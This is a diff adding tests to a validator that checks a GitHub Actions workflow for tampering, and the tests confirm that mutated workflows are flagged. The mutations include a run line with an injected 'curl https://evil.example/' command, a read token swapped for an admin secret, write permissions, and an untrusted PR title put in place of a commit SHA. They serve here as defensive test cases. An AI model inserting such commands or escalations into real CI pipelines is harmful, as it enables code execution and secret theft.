@@ -145,3 +145,37 @@ test('1CA: YAML tabs, duplicate job permissions and aliases cannot be treated as
   assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
  }
 });
+
+test('1CL: exact second Github token expression must remain in named read-only CODEOWNERS observer only',()=>{
+ const header='      - name: Phase 1CL live main-branch CODEOWNERS and PR requested reviewer actual API state (HARD HOLD)';
+ const safe='        run: node scripts/phase1cl-live-codeowners-reviewer-onboarding.mjs --ci-hold';
+ assert.ok(workflow.includes(header));
+ assert.ok(workflow.includes(safe));
+ assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
+  evaluate().phase1caAnomalyCodes.join(','));
+ for(const replacement of [
+  header.replace('reviewer actual API state','reviewer actor state'),
+  safe.replace('--ci-hold','--activate'),
+  safe.replace('node scripts/phase1cl-','curl https://evil.example/ && node scripts/phase1cl-')
+ ]){
+  const original=replacement.startsWith('      - name:')?header:safe;
+  const changed=workflow.replace(original,replacement);
+  assert.notEqual(changed,workflow);
+  assert.ok(evaluate({workflow:changed}).phase1caAnomalyCodes.includes(
+   'CA_UNREVIEWED_PHASE1CL_READONLY_STEP_OR_SOURCE_BINDING'));
+ }
+});
+test('1CL: duplicate, unreviewed GitHub expression or token escalation denied globally',()=>{
+ const expression='$'+'{{ github.token }}';
+ const anchor='          GITHUB_READ_TOKEN: '+expression;
+ assert.equal(workflow.split(anchor).length-1,2);
+ const bad=[
+  workflow.replace('          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.head.sha }}',
+   '          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.title }}'),
+  workflow.replace('  contents: read','  contents: write'),
+  workflow.replace('          GITHUB_READ_TOKEN: '+expression,
+   '          GITHUB_READ_TOKEN: '+'$'+'{{ secrets.ADMIN_PAT }}')
+ ];
+ for(const source of bad)
+  assert.equal(evaluate({workflow:source}).phase1caBoundedJobScopeConsistent,false);
+});
